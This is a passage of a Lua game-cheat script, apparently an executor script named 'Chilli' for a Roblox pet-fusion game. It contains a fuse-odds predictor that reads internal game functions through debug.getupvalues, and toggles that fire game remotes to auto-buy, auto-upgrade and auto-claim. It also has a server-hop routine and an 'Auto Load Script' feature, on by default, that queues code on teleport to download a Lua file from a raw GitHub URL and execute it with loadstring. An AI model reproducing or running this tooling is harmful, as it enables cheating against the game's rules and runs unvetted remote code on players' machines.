		{ Min = 0.85, Color = "#FFFFFF" },
		{ Min = 1.45, Color = "#7CFF9E" },
		{ Min = 1.9, Color = "#4FE0FF" },
		{ Min = 2.85, Color = "#6FA0FF" },
		{ Min = 3.8, Color = "#C08BFF" },
		{ Min = 5.8, Color = "#FF9A3D" },
		{ Min = 9.5, Color = "#FF5C5C" },
		{ Min = 12, Color = "#FFD34D" },
		{ Min = 20, Color = "#FF4DE8" },
	}

	local function fn8(arg)
		local n22 = -math.huge
		local str = "#FFFFFF"

		for _, v10 in ipairs(tbl13) do
			if arg + 0.001 >= v10.Min and v10.Min > n22 then
				str = v10.Color
				n22 = v10.Min
			end
		end

		return str
	end

	local function fn9(arg, arg2)
		local eggRecords = tbl.EggRecords
		if type(eggRecords) ~= "table" or type(eggRecords.WeightKgForScale) ~= "function" then
			return nil
		end
		local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
		if ok and type(result) == "number" and result > 0 then
			return result
		end
		return nil
	end

	local function fn10(arg)
		if type(arg) ~= "table" or #arg == 0 then
			return nil
		end
		local n22 = -math.huge
		local v10 = nil

		for _, v11 in ipairs(arg) do
			local v12 = tbl7.MutationMultiplier({ v11 })

			if n22 < v12 then
				n22 = v12
				v10 = v11
			end
		end

		return v10
	end

	local function fn11()
		if v9 then
			return v9
		end
		local eggRecords = tbl.EggRecords
		local getupvalues_ = type(debug) == "table" and debug.getupvalues or getupvalues

		if type(eggRecords) == "table" and type(eggRecords.DrawAssetScale) == "function" and type(getupvalues_) == "function" then
			local ok, result = pcall(getupvalues_, eggRecords.DrawAssetScale)

			if ok and type(result) == "table" then
				for _, v10 in pairs(result) do
					if type(v10) == "table" and type(v10[1]) == "table" and v10[1].min and v10[1].weight then
						v9 = v10
						break
					end
				end
			end
		end

		v9 = v9 or tbl8
		return v9
	end

	local function fn12(arg, arg2, arg3)
		local fuseKernel = tbl.FuseKernel

		if type(fuseKernel) == "table" and type(fuseKernel.BandWeightBias) == "function" then
			local ok, result = pcall(fuseKernel.BandWeightBias, arg, arg2, arg3)
			if ok and type(result) == "number" then
				return result
			end
		end

		return math.exp(math.log((arg[1] + arg[2] + arg[3]) / 3) / 0.69314718055994529 * math.log((arg2 + arg3) / 2) / 0.69314718055994529 * 0.6)
	end

	local function fn13()
		local save = tbl.Save
		if type(save) ~= "table" or type(save.Get) ~= "function" then
			return nil
		end
		local ok, result = pcall(save.Get)
		if not ok or type(result) ~= "table" then
			return nil
		end
		local fusionSlots = type(result.FusionSlots) == "table" and result.FusionSlots or {}
		local inventory = type(result.Inventory) == "table" and result.Inventory or {}
		local tbl14 = {}

		for i = 1, 3 do
			local v10 = fusionSlots[i]
			local flag2 = v10 ~= nil and inventory[v10] or nil

			if type(flag2) == "table" then
				table.insert(tbl14, {
					Category = flag2.Category,
					Scale = tonumber(flag2.Scale) or 1,
					Mutations = type(flag2.Mutations) == "table" and flag2.Mutations or {},
				})
			end
		end

		return {
			Items = tbl14,
			Locked = result.FusionLocked == true,
			Duration = tonumber(result.FusionDuration) or 0,
			Reward = result.FusionEggReward ~= nil and result.FusionEggReward ~= false,
		}
	end

	local function fn14(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl7.SecretGradient
		end
		return arg.Gradient
	end

	local function fn15(arg)
		return fn14(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
	end

	local function fn16(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl7.SecretRotation
		end
		return nil
	end

	local function fn17(arg)
		v8 = arg
		arg:SetDock(5, { Gap = n11, DividerColor = Color3.fromRGB(170, 174, 184) })
		local v10 = arg:Dock()

		tbl9.Icon = arg:Image({
			Parent = v10,
			X = 0,
			Y = 0,
			Width = n,
			Height = n,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.26,
			StrokeThickness = n12,
			StrokeTransparency = 0,
			ZIndex = 8,
		})

		tbl9.Name = arg:Text({
			Parent = v10,
			X = n2,
			Y = 0,
			Height = n3,
			Scale = n4,
			Wrap = false,
			Gradient = tbl7.NameGradient,
			TextStrokeTransparency = 1,
			ZIndex = 9,
		})

		tbl9.Rarity = arg:Text({
			Parent = v10,
			X = n2,
			Y = 0,
			Height = n3,
			Scale = n5,
			Wrap = false,
			Font = tbl7.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			ZIndex = 9,
		})

		tbl9.Info = arg:Text({ Parent = v10, X = n2, Y = n3, Height = n - n3, Wrap = false, ZIndex = 9 })

		arg:OnResize(function(arg2, arg3, arg4)
			if arg3 == n16 and arg4 == n17 then
				return
			end
			n16 = arg3
			n17 = arg4
			n13 = arg3 / math.max(arg4, 1)
			n14 = arg4
			n21 = 2
			n15 = 0.9 / math.max(arg:TextSize(), 1)
			tbl9.Rarity.Set({ StrokeThickness = n15 })

			for _, v11 in ipairs(tbl10) do
				v11.Rarity.Set({ StrokeThickness = n15 })
			end
		end)
	end

	local function fn18(arg)
		local v10 = arg and arg.Get()
		if not v10 or n14 <= 0 then
			return nil
		end

		if v10.Text ~= tostring(arg.Spec.Text or "") then
			return nil
		end
		return v10
	end

	local function fn19(arg)
		local v10 = fn18(arg)
		if not v10 then
			return nil
		end
		local size = v10.Size
		local textWrapped = v10.TextWrapped
		v10.TextWrapped = false
		v10.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
		local x = v10.TextBounds.X
		v10.Size = size
		v10.TextWrapped = textWrapped
		if x <= 0 then
			return nil
		end
		return x / n14
	end

	local function fn20(arg, arg2)
		local v10 = fn18(arg)
		if not v10 then
			return nil
		end
		local size = v10.Size
		v10.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n14 + 0.5)), 100000)
		local y = v10.TextBounds.Y
		v10.Size = size
		if y <= 0 then
			return nil
		end
		return y / n14
	end

	local function fn21(arg)
		local v10 = tbl11[arg]

		if not v10 then
			local v11 = v8:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
			tbl11[arg] = v11
			v10 = v11
		end

		return v10
	end

	local function fn22(arg)
		local v10 = tbl10[arg]
		if v10 then
			return v10
		end

		local tbl14 = {
			Frame = v8:Frame({
				Name = "Slot",
				Background = "#000000",
				BackgroundTransparency = 0.74,
				Corner = 0.35,
				X = 0,
				Y = 0,
				Width = 1,
				Height = 1,
				Visible = false,
			}),
		}

		tbl14.Icon = v8:Image({
			Parent = tbl14.Frame,
			X = n7,
			Y = 0,
			Width = n6,
			Height = n6,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.45,
			StrokeThickness = n12,
			StrokeTransparency = 0,
		})

		tbl14.Name = v8:Text({
			Parent = tbl14.Frame,
			X = n7 + n9,
			Y = 0,
			Width = 1,
			Height = n3,
			Scale = n4,
			Wrap = false,
			Gradient = tbl7.NameGradient,
			TextStrokeTransparency = 1,
		})

		tbl14.Rarity = v8:Text({
			Parent = tbl14.Frame,
			X = n7 + n9,
			Y = 0,
			Width = 1,
			Height = n3,
			Scale = n5,
			Wrap = false,
			Font = tbl7.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			StrokeThickness = n15,
		})

		tbl14.Detail = v8:Text({
			Parent = tbl14.Frame,
			X = n7 + n9,
			Y = n3,
			Width = math.max(1, n13 - n9 - n7 * 2),
			Height = 1,
			Wrap = true,
		})

		tbl14.Status = v8:Text({
			Parent = tbl14.Frame,
			X = 0,
			Y = 0,
			Width = 1,
			Height = n3,
			Wrap = false,
			Align = "Right",
			Color = color2.Hint,
		})

		tbl10[arg] = tbl14
		return tbl14
	end

	local function fn23()
		if n13 <= 0 then
			return
		end
		flag = false
		local n22 = math.max(1, n13 - n2)
		local v10 = fn19(tbl9.Rarity)

		if v10 then
			n20 = v10 + 0.1
		else
			flag = true
		end

		local v11 = fn19(tbl9.Name)

		if v11 then
			n19 = math.min(v11 + 0.1, math.max(1, n22 - n20 - n10))
		else
			flag = true
		end

		tbl9.Name.Set({ X = n2, Y = 0, Width = n19, Height = n3 })

		tbl9.Rarity.Set({
			X = n2 + n19 + n10,
			Y = 0,
			Width = math.max(0.5, math.min(n20, n22 - n19 - n10)),
			Height = n3,
		})

		tbl9.Info.Set({ X = n2, Y = n3, Width = n22, Height = math.max(1, n - n3) })
		local n23 = math.max(1, n13 - n9 - n7 * 2)
		local n24 = 0

		for _, v12 in ipairs(tbl12) do
			if v12.Kind == "text" then
				local handle = v12.Handle
				local v13 = fn20(handle, n13)

				if v13 then
					v12.Height = v13
				else
					flag = true
				end

				local n25 = math.max(1, v12.Height or 1)
				handle.Set({ X = 0, Y = n24 + (v12.Gap and 0.5 or 0), Width = n13, Height = n25 })
				n24 += n25 + n11 * 0.5 + (v12.Gap and 0.5 or 0)
			else
				local slot = v12.Slot
				local v13 = fn20(slot.Detail, n23)

				if v13 then
					slot.DetailUnits = v13
				else
					flag = true
				end

				local n25 = math.clamp(slot.DetailUnits or 1, 1, 4)
				local v14 = fn19(slot.Status)

				if v14 then
					slot.StatusUnits = v14 + 0.23
				else
					flag = true
				end

				local n26 = math.min(n23 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
				local n27 = math.max(1, n23 - n26 - n10)
				local v15 = fn19(slot.Rarity)

				if v15 then
					slot.RarityUnits = v15 + 0.1
				else
					flag = true
				end

				local n28 = math.min(slot.RarityUnits or 3, n27 * 0.5)
				local v16 = fn19(slot.Name)

				if v16 then
					slot.NameUnits = v16 + 0.1
				else
					flag = true
				end

				local min = math.min
				local max = math.max
				local nameUnits = slot.NameUnits or 4
				local max2 = math.max
				local n29 = n27 - n28 - n10
				local v17 = min(max(1, nameUnits), max2(1, n29))
				local n30 = n8 * 2
				local n31 = math.max(n25 + n3, 2.3) + n30
				local n32 = (n31 - n25 - n3) / 2
				slot.Frame.Set({ X = 0, Y = n24, Width = n13, Height = n31 })
				slot.Icon.Set({ Y = (n31 - n6) / 2 })
				slot.Name.Set({ X = n7 + n9, Y = n32, Width = v17 })
				slot.Rarity.Set({ X = n7 + n9 + v17 + n10, Y = n32, Width = math.max(0.5, n28) })
				slot.Detail.Set({ X = n7 + n9, Y = n32 + n3, Width = n23, Height = n25 })
				slot.Status.Set({ X = n7 + n9 + n23 - n26, Y = n32, Width = math.max(0.5, n26) })
				n24 += n31 + n11
			end
		end

		local n25 = math.max(1, n24)

		if math.abs(n25 - n18) > 0.01 then
			n18 = n25
			v8:SetContentLines(n25)
		end
	end

	local function fn24(arg, arg2)
		local flag2 = arg ~= nil
		v8:SetDock(flag2 and 5 or 0, { Gap = n11 })
		tbl9.Icon.Set({ Visible = flag2 })
		tbl9.Name.Set({ Visible = flag2 })
		tbl9.Rarity.Set({ Visible = flag2 })
		tbl9.Info.Set({ Visible = flag2 })
		if not flag2 then
			return
		end
		tbl9.Icon.Set({ Visible = arg.Icon ~= nil, Image = arg.Icon or "", StrokeColor = arg.Color })
		tbl9.Name.Set({ Text = tbl7.Escape(arg.Name) })

		tbl9.Rarity.Set({
			Text = string.upper(tostring(arg.Rarity)),
			Color = fn15(arg),
			Gradient = fn14(arg),
			GradientRotation = fn16(arg),
		})

		local v10 = paint(color2.Text, string.format("Fusing %d of 3 pets", #arg2.Items))

		if arg2.Reward then
			v10 = bold(paint(color2.Ready, "Fuse finished, claim your egg"))
		elseif arg2.Locked then
			local n22 = arg2.Duration > 1e9 and arg2.Duration - workspace:GetServerTimeNow() or 0
			v10 = bold(paint(color2.Clock, n22 > 0 and "Fusing" .. tbl7.Separator() .. tbl7.FormatClock(n22) or "Fusing"))
		end

		local set = tbl9.Info.Set
		local tbl14 = {}
		local concat = table.concat
		local tbl15 = {}
		local v11 = bold(paint(color2.Income, tbl7.FormatRate(tbl7.Income(arg, arg2.Items[1].Scale, arg2.Items[1].Mutations))))
		local v12 = paint(color2.Text, string.format("%d/3 loaded", #arg2.Items))
		tbl15[1] = v11
		tbl15[2] = v12
		tbl15[3] = v10
		tbl14.Text = concat(tbl15, "\n")
		set(tbl14)
	end

	local function refreshFuse()
		if not v8 then
			return
		end
		n21 = 2
		table.clear(tbl12)
		local n22 = 0

		local function fn25(arg, arg2)
			n22 += 1
			local v10 = fn21(n22)
			v10.Set({ Visible = true, Text = arg })
			table.insert(tbl12, { Kind = "text", Handle = v10, Gap = arg2 })
		end

		local function fn26(arg, arg2)
			local flag2 = #tbl12 > 0
			fn25(string.format("<b><font color=\"%s\">%s</font></b>", arg2, arg), flag2)
		end

		local v10 = fn13()
		local n23

		if not v10 then
			fn24(nil, nil)
			fn25(bold(paint(color2.Hint, "Fuse machine data is not available yet")), false)
			n23 = 0
		elseif #v10.Items == 0 then
			fn24(nil, nil)
			fn25(bold(paint(color2.Text, "Machine is empty")), false)
			fn25(paint(color2.Hint, "Load 3 pets of the same species to see the result odds"), false)
			n23 = 0
		else
			local items = v10.Items
			local v11 = tbl7.AssetInfo(items[1].Category)
			fn24(v11, v10)
			local text = color2.Text
			fn26(string.format("FUSE MACHINE STATUS (%d/3 PETS)", #items), text)
			fn25(paint(color2.Hint, "Species") .. "  " .. bold(paint(v11.Hex, "[" .. string.upper(tostring(v11.Rarity)) .. "]")) .. " " .. bold(paint(color2.Text, tbl7.Escape(v11.Name))), false)
			n23 = 0

			for i = 1, 3 do
				local v12 = items[i]
				n23 += 1
				local v13 = fn22(n23)
				v13.Frame.Set({ Visible = true })
				v13.Status.Set({ Text = "SLOT " .. i })

				if v12 then
					v13.Icon.Set({ Visible = v11.Icon ~= nil, Image = v11.Icon or "", StrokeColor = v11.Color })
					v13.Name.Set({ Text = tbl7.Escape(v11.Name) })

					v13.Rarity.Set({
						Text = string.upper(tostring(v11.Rarity)),
						Color = fn15(v11),
						Gradient = fn14(v11),
						GradientRotation = fn16(v11),
					})

					local v14 = fn9(v12.Category, v12.Scale)
					local v15 = bold(paint(color2.Scale, string.format("%.2fx", v12.Scale)))

					if v14 then
						v15 ..= tbl7.Separator() .. paint(color2.Weight, tbl7.FormatWeight(v14))
					end

					local str = v15 .. tbl7.Separator() .. bold(paint(color2.Income, tbl7.FormatRate(tbl7.Income(v11, v12.Scale, v12.Mutations))))
					local v16 = tbl7.MutationText(v12.Mutations)

					v13.Detail.Set({
						Text = str .. tbl7.Separator() .. (v16 ~= "" and v16 or paint(color2.Hint, "Normal")),
					})
				else
					v13.Icon.Set({ Visible = false })
					v13.Name.Set({ Text = paint(color2.Hint, "Empty") })
					v13.Rarity.Set({ Text = "", Gradient = nil })
					v13.Detail.Set({ Text = paint(color2.Hint, "Add a pet to this slot") })
				end

				table.insert(tbl12, { Kind = "slot", Slot = v13 })
			end

			local n24 = 0

			for _, item in ipairs(items) do
				n24 += item.Scale
			end

			local n25 = n24 / #items
			local v12 = fn9(items[1].Category, n25)
			local str = paint(color2.Hint, "Average Scale") .. "  " .. bold(paint(color2.Scale, string.format("%.2fx", n25)))

			if v12 then
				str ..= tbl7.Separator() .. paint(color2.Weight, tbl7.FormatWeight(v12))
			end

			fn25(str, false)
			local v13 = nil

			for _, item in ipairs(items) do
				local v14 = fn10(item.Mutations)

				if v14 then
					if (v13 and tbl7.MutationMultiplier({ v13 }) or 0) < tbl7.MutationMultiplier({ v14 }) then
						v13 = v14
					end
				end
			end

			local tbl14 = v13 and { v13 } or {}
			fn26("PREDICTED SIZE PROBABILITIES", color2.Income)

			if #items == 3 then
				local tbl15 = { items[1].Scale, items[2].Scale, items[3].Scale }
				local tbl16 = {}
				local n26 = 0

				for _, v14 in ipairs(fn11()) do
					local n27 = v14.weight * fn12(tbl15, v14.min, v14.max)
					n26 += n27
					table.insert(tbl16, { Min = v14.min, Max = v14.max, Weight = n27, Color = fn8(v14.min) })
				end

				table.sort(tbl16, function(arg, arg2)
					return arg.Weight > arg2.Weight
				end)

				local v14 = tbl16[1]

				for _, v15 in ipairs(tbl16) do
					local n27 = n26 > 0 and v15.Weight / n26 * 100 or 0
					local v16 = bold(paint(v15.Color, string.format("%.2fx - %.2fx", v15.Min, v15.Max)))
					local v17 = fn9(items[1].Category, v15.Min)
					local v18 = fn9(items[1].Category, v15.Max)

					if v17 and v18 then
						local weight = color2.Weight
						local format = string.format
						local formatWeight = tbl7.FormatWeight
						v16 ..= tbl7.Separator() .. paint(weight, format("%s - %s", tbl7.FormatWeight(v17), formatWeight(v18)))
					end

					fn25(v16 .. tbl7.Separator() .. bold(paint(n27 >= 10 and color2.Income or n27 >= 1 and color2.Clock or color2.Hint, string.format(n27 >= 1 and "%.1f%%" or "%.3f%%", n27))), false)
				end

				fn26("RESULT PREDICTION", color2.Text)
				fn25(paint(color2.Hint, "Predicted Mutation") .. "  " .. (v13 and tbl7.MutationText(tbl14) or paint(color2.Text, "Normal")), false)

				if v14 then
					fn25(paint(color2.Hint, "Estimated Value") .. "  " .. bold(paint(color2.Income, tbl7.FormatRate(tbl7.Income(v11, v14.Min, tbl14)) .. " ~ " .. tbl7.FormatRate(tbl7.Income(v11, v14.Max, tbl14)))) .. tbl7.Separator() .. paint(color2.Hint, "at ") .. bold(paint(v14.Color, string.format("%.2fx - %.2fx", v14.Min, v14.Max))), false)
				end

				local v15, v16, v17 = ipairs(tbl16)
				local v18 = nil

				for _, v19 in v15, v16, v17 do
					if not v18 or v19.Max > v18.Max then
						v18 = v19
					end
				end

				if v18 then
					fn25(paint(color2.Hint, "Best Case") .. "  " .. bold(paint(v18.Color, string.format("%.2fx - %.2fx", v18.Min, v18.Max))) .. "  " .. bold(paint(color2.Income, tbl7.FormatRate(tbl7.Income(v11, v18.Max, tbl14)))), false)
				end
			else
				fn25(paint(color2.Hint, string.format("Load %d more of the same species to see the odds", 3 - #v10.Items)), false)
			end
		end

		for i = n22 + 1, #tbl11 do
			tbl11[i].Set({ Visible = false })
		end

		for i = n23 + 1, #tbl10 do
			tbl10[i].Frame.Set({ Visible = false })
		end

		fn23()
		n21 = 2
	end

	if not tbl7.Ready then
		v7:CreateText({ Name = "Fuse Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		local v10 = v7:CreateCanvas({
			Name = "Fuse Predictor",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 34,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(arg)
				fn17(arg)

				if type(tbl7.RequestEggRefresh) == "function" then
					tbl7.RequestEggRefresh()
				end
			end,
		})

		tbl7.RefreshFuse = refreshFuse

		tbl7.PlaceFuse = function()
			if n21 > 0 or flag then
				if n21 > 0 then
					n21 -= 1
				end

				pcall(fn23)
			end
		end

		fn4(function()
			v10:Destroy()
		end)
	end
end

do
	local v8 = v2:CreateTab({ Name = "Progress", SectionsExpanded = true }):CreateSection({ Name = "Auto Progression", Expanded = true })
	local tbl8 = {}
	local tbl9

	tbl9 = {
		Remote = function(arg)
			local v9 = tbl8[arg]
			if v9 ~= nil then
				return v9 or nil
			end
			local v10 = networking:FindFirstChild(arg)
			tbl8[arg] = v10 or false
			return v10
		end,
		Invoke = function(arg, ...)
			local v9 = tbl9.Remote(arg)
			if not v9 or not v9:IsA("RemoteFunction") then
				return false, nil
			end
			local ok, result = pcall(v9.InvokeServer, v9, ...)
			return ok, result
		end,
		Fire = function(arg, ...)
			local v9 = tbl9.Remote(arg)
			if not v9 or not v9:IsA("RemoteEvent") then
				return false
			end
			return pcall(v9.FireServer, v9, ...)
		end,
	}

	local function saveData()
		local save = tbl.Save
		if type(save) ~= "table" or type(save.Get) ~= "function" then
			return nil
		end
		local ok, result = pcall(save.Get)
		return ok and type(result) == "table" and result or nil
	end

	tbl9.SaveData = saveData
	local tbl10 = { "Money", "Cash", "Coins", "Currency", "Balance" }

	tbl9.Money = function()
		local v9 = saveData()

		if v9 then
			for _, v10 in ipairs(tbl10) do
				local num = tonumber(v9[v10])
				if num then
					return num
				end
			end
		end

		local leaderstats = localPlayer:FindFirstChild("leaderstats")

		if leaderstats then
			for _, v10 in ipairs(tbl10) do
				local v11 = leaderstats:FindFirstChild(v10)
				if v11 and tonumber(v11.Value) then
					return tonumber(v11.Value)
				end
			end
		end

		return nil
	end

	tbl9.AddWorker = tbl3.Add
	tbl9.Backoff = tbl3.Backoff

	local tbl11 = {
		"Money",
		"BaseUpgradeLevel",
		"TreadmillUpgradeLevel",
		"TrailInventory",
		"PendingOfflineMoney",
	}

	local save = tbl.Save

	if type(save) == "table" and type(save.FieldSignal) == "function" then
		for _, v9 in ipairs(tbl11) do
			local ok, result = pcall(save.FieldSignal, v9)

			if ok and type(result) == "table" and type(result.Connect) == "function" then
				local ok2, result2 = pcall(result.Connect, result, function()
					tbl3.Wake()
				end)

				if ok2 and result2 then
					fn4(function()
						pcall(function()
							result2:Disconnect()
						end)
					end)
				end
			end
		end
	end

	local v9 = nil
	local v10 = nil
	local tbl12 = {}

	local function fn8()
		local v11 = fn2(function()
			return ReplicatedStorage.Data.Trails
		end)

		local directory = type(v11) == "table" and v11.Directory or nil
		if type(directory) ~= "table" then
			return {}
		end
		local tbl13 = {}

		for k, v12 in pairs(directory) do
			if type(v12) == "table" then
				table.insert(tbl13, { Id = tostring(v12._id or k), Price = tonumber(v12.Price) or math.huge })
			end
		end

		table.sort(tbl13, function(arg, arg2)
			return arg.Price < arg2.Price
		end)

		return tbl13
	end

	local function fn9(arg)
		if not tbl6.ReadToggle(v9, false) then
			return false
		end
		v10 = v10 or fn8()
		local v11 = tbl9.SaveData()
		if not v11 or #v10 == 0 then
			return false
		end
		local trailInventory = type(v11.TrailInventory) == "table" and v11.TrailInventory or {}
		local n2 = tonumber(v11.Money) or 0

		for _, v12 in ipairs(v10) do
			if trailInventory[v12.Id] ~= true and not tbl12[v12.Id] and v12.Price <= n2 then
				local AskPurchase, v13 = tbl9.Invoke("RF/Trailwear/AskPurchase", v12.Id)
				if AskPurchase and v13 ~= false then
					return true
				end
				tbl12[v12.Id] = true
				tbl9.Backoff(arg)
				return false
			end
		end

		return false
	end

	v9 = v8:CreateToggle({
		Name = "Auto Buy Trail",
		Note = "Automatically buy available trails when affordable",
		Default = false,
		Callback = function()
			table.clear(tbl12)
			v10 = nil
		end,
	})

	tbl9.AddWorker(fn9)
	local v11 = nil

	local function fn10()
		if not tbl6.ReadToggle(v11, false) then
			return false
		end
		local v12 = tbl9.SaveData()
		if not v12 then
			return false
		end

		local v13 = fn2(function()
			return ReplicatedStorage.Data.Bases
		end)

		local bases = type(v13) == "table" and v13.BASES or nil
		if type(bases) ~= "table" then
			return false
		end
		local n2 = tonumber(v12.BaseUpgradeLevel) or 0
		local ok = nil

		if type(v13.GetMaxBaseLevel) == "function" then
			local result
			ok, result = pcall(v13.GetMaxBaseLevel)
			ok = ok and tonumber(result) or nil
		end

		if ok and n2 >= ok then
			return false
		end
		local v14 = bases[n2 + 1]
		local num = type(v14) == "table" and tonumber(v14.Cost) or nil
		local flag

		if num then
			flag = (tonumber(v12.Money) or 0) >= num
		else
			flag = num
		end

		if flag then
			return tbl9.Fire("RE/Homestead/AskBaseTierRaise")
		end
		return false
	end

	v11 = v8:CreateToggle({
		Name = "Auto Upgrade Base",
		Note = "Automatically upgrade base when money is available",
		Default = false,
	})

	tbl9.AddWorker(fn10)
	local v12 = nil

	local function fn11()
		if not tbl6.ReadToggle(v12, false) then
			return false
		end
		local v13 = tbl9.SaveData()
		if not v13 then
			return false
		end

		local v14 = fn2(function()
			return ReplicatedStorage.Data.Treadmills
		end)

		if type(v14) ~= "table" or type(v14.GetByUpgradeLevel) ~= "function" then
			return false
		end
		local ok, result = pcall(v14.GetByUpgradeLevel, (tonumber(v13.TreadmillUpgradeLevel) or 0) + 1)
		if not ok or type(result) ~= "table" then
			return false
		end
		local id = result._id
		local huge = tonumber(result.Price) or math.huge
		local flag = type(id) == "string"
		local flag2

		if flag then
			flag2 = (tonumber(v13.Money) or 0) >= huge
		else
			flag2 = flag
		end

		if flag2 then
			local AskTierRaise, v15 = tbl9.Invoke("RF/Treadmill/AskTierRaise", id)
			return AskTierRaise and v15 ~= false
		end
		return false
	end

	v12 = v8:CreateToggle({
		Name = "Auto Upgrade Treadmill",
		Note = "Automatically upgrade treadmill when money is available",
		Default = false,
	})

	tbl9.AddWorker(fn11)
	local n2 = 15
	local v13 = nil
	local n3 = 15
	local now = os.clock()

	local function fn12()
		if not tbl6.ReadToggle(v13, false) then
			return false
		end
		local now2 = os.clock()
		n3 += now2 - now
		now = now2
		local v14 = tbl9.SaveData()
		local num = v14 and tonumber(v14.PendingOfflineMoney) or nil

		if num == nil then
			local PendingCheck, v15 = tbl9.Invoke("RF/AwayEarnings/PendingCheck")
			num = PendingCheck and v15 ~= false and v15 ~= nil and 1 or 0
		end

		local flag = false

		if num > 0 then
			local v15
			flag, v15 = tbl9.Invoke("RF/AwayEarnings/AskCollect")
			flag = flag and v15 ~= false
		end

		if n2 <= n3 then
			n3 = 0
			local AskRedeemAll, v15 = tbl9.Invoke("RF/Codex/AskRedeemAll")
			flag = flag or AskRedeemAll and v15 ~= false
			tbl9.Invoke("RF/Codex/AskRedeemLimitedEgg")
		end

		return flag
	end

	v13 = v8:CreateToggle({
		Name = "Auto Claim",
		Note = "Claim offline money & index rewards",
		Default = false,
		Callback = function()
			n3 = n2
		end,
	})

	tbl9.AddWorker(fn12)

	tbl4.IndexClaimHandle = v8:CreateToggle({
		Name = "Auto Claim Index",
		Note = "Claim index rewards as soon as they unlock",
		Default = false,
		Callback = function()
			if type(tbl4.IndexClaimRestart) == "function" then
				tbl4.IndexClaimRestart()
			end
		end,
	})
end

local fn8

fn8 = function(arg, arg2)
	if type(v.Notify) == "function" then
		pcall(v.Notify, arg, arg2, 5)
	end
end

local v8
v8 = v2:CreateTab({ Name = "Server", SectionsExpanded = true }):CreateSection({ Name = "Server", Expanded = true })
local TeleportService
TeleportService = game:GetService("TeleportService")
local HttpService
HttpService = game:GetService("HttpService")
local GuiService
GuiService = game:GetService("GuiService")

do
	local function fn9()
		if type(queue_on_teleport) == "function" then
			return queue_on_teleport
		end

		if type(queueonteleport) == "function" then
			return queueonteleport
		end

		if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
			return syn.queue_on_teleport
		end

		if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
			return fluxus.queue_on_teleport
		end
		return nil
	end

	local function fn10(arg)
		pcall(function()
			TeleportService:SetTeleportSetting("__ChilliAutoLoadScriptEnabled", arg)
		end)

		if not arg then
			return true
		end
		local v9 = fn9()
		if not v9 then
			return false
		end

		if rawget(_G, "__ChilliAutoLoadQueued") ~= true then
			if not pcall(v9, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
    enabled = TeleportService:GetTeleportSetting("__ChilliAutoLoadScriptEnabled") == true
end)
if enabled then
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    pcall(function()
        local player = game:GetService("Players").LocalPlayer
        if player and not player.Character then
            player.CharacterAdded:Wait()
        end
    end)
    task.wait(1.5)
    local ok, source = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end)
    if ok and type(source) == "string" then
        local chunk = loadstring(source)
        if chunk then
            chunk()
        end
    end
end
]]) then
				return false
			end

			_G.__ChilliAutoLoadQueued = true
		end

		return true
	end

	local v9 = nil

	local function fn11()
		if v9 and tbl4.Toggle(v9, false) then
			fn10(true)
		end
	end

	v9 = v8:CreateToggle({
		Name = "Auto Load Script",
		Default = true,
		Callback = function(arg)
			local flag = arg == true

			if not fn10(flag) and flag then
				task.defer(function()
					fn10(false)

					if v9 and type(v9.Set) == "function" then
						pcall(v9.Set, v9, false, false)
					end

					fn8("Auto Load Unavailable", "This executor does not support queue on teleport.")
				end)
			end
		end,
	})

	local str = "Least Players"
	local n2 = 10
	local n3 = 0
	local v10 = nil
	local tbl8 = {}
	local flag = false
	local n4 = 0
	local flag2 = false
	local v11 = nil
	local str2 = ""
	local n5 = 0
	local n6 = 60

	local function fn12(arg)
		n3 = 0
		v10 = nil

		if arg then
			tbl8[arg] = true
		end
	end

	pcall(function()
		TeleportService.TeleportInitFailed:Connect(function(arg, arg2, arg3)
			if not v10 then
				return
			end
			fn12(v10)
			flag2 = true

			if not flag then
				fn8("Server Hop Failed", tostring(arg3 ~= "" and arg3 or arg2))
			end
		end)
	end)

	local function fn13(arg)
		local str3 = tostring(game.JobId or "")
		local tbl9 = {}
		local flag3 = arg == "Random"
		local str4 = arg == "Least Players" and "Asc" or "Desc"
		local n7 = flag3 and 3 or 6
		local nextPageCursor = nil

		for i = 1, n7 do
			local str5 = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, str4)

			if nextPageCursor and nextPageCursor ~= "" then
				str5 ..= "&cursor=" .. HttpService:UrlEncode(nextPageCursor)
			end

			local ok, result = pcall(function()
				return HttpService:JSONDecode(game:HttpGet(str5))
			end)

			if not ok or type(result) ~= "table" then
				return tbl9, false
			end
			local v12 = ipairs
			local data = result.data or {}

			for _, v13 in v12(data) do
				local str6 = tostring(v13.id or "")
				local huge = tonumber(v13.playing) or math.huge
				local n8 = tonumber(v13.maxPlayers) or 0

				if str6 ~= "" and str6 ~= str3 and huge < n8 then
					tbl9[#tbl9 + 1] = { Id = str6, Playing = huge, Room = n8 - huge }
				end
			end

			if #tbl9 > 0 and not flag3 then
				break
			end
			nextPageCursor = result.nextPageCursor
			if not nextPageCursor or nextPageCursor == "" then
				break
			end
		end

		return tbl9, true
	end

	local function serverHop(arg)
		local v12

		if v11 and str2 == arg and os.clock() - n5 < n6 then
			v12 = v11
		else
			local v13
